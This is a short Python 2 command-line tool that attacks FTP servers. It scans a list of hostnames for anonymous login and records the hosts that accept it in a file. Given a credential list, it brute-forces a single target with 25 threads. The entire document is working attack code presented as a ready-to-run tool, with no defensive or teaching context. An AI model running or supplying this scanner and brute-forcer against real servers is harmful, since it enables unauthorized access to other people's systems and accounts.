#!/usr/bin/env python

import ftplib
import optparse
from threading import Thread
import Queue

def anony_login(hostname):

    try:
	ftp = ftplib.FTP(hostname)
	ftp.login('anonymous','me@me.com')
	print('\n[+] ' + str(hostname) + ' FTP Anonymous Logon Succeeded')
	with open('good_anony_ftp.txt','a') as f:
	    f.writelines(hostname + '\n')
	ftp.quit()
    except Exception,e:
	print('\n[-] ' + str(hostname) + ' Failed!')

def brute_login(target,dic_list,verbose):

    while not dic_list.empty():
	dic  = dic_list.get()
	user = dic.split(':')[0]
	pswd = dic.split(':')[1]

	if verbose:
	    print('[*] Trying: ' + user + '/' + pswd)	
	try:
	    ftp = ftplib.FTP(target)
	    ftp.login(user,pswd)
	    print('\n[+] FTP Logon Succeeded: ' + user + '/' + pswd)
	    ftp.quit()
	except:
	    pass
    
def main():

    threads = 25

    parser = optparse.OptionParser('Usage: -f <hostname file>' + \
	'| -t <target> -P <user_pass_file> -v')
    
    parser.add_option('-f','--file',dest='file_name',type='string',\
	help='Specify hostname file')
    parser.add_option('-t','--target',dest='target',type='string',\
	help='Specify target ip or domain')
    parser.add_option('-P','--Pass',dest='pass_file',type='string',\
	help='Specify crack ftp user and pass')
    parser.add_option('-v','--verbose',dest='verbose',\
	action='store_true',default=False,help='show verbose')

    (options, args) = parser.parse_args()
    
    if options.file_name == None and options.target == None:
	print(parser.usage)
	exit(0)

    if options.target == None:
	with open(options.file_name) as f:
	    for hostname in f.readlines():
		hostname = hostname.rstrip()
		anony_login(hostname)
    else:

	if options.pass_file == None:
	    print('[!] Using -P to specify password file')
	    exit()
	else:
	    dic_list = Queue.Queue()
	    with open(options.pass_file,'r') as f:
		for line in f.readlines():
		    dic_list.put(line.rstrip())

	    for t in range(threads):
		Thread(target=brute_login,args=(options.target,dic_list,options.verbose,)).start()

if __name__=='__main__':
    main()
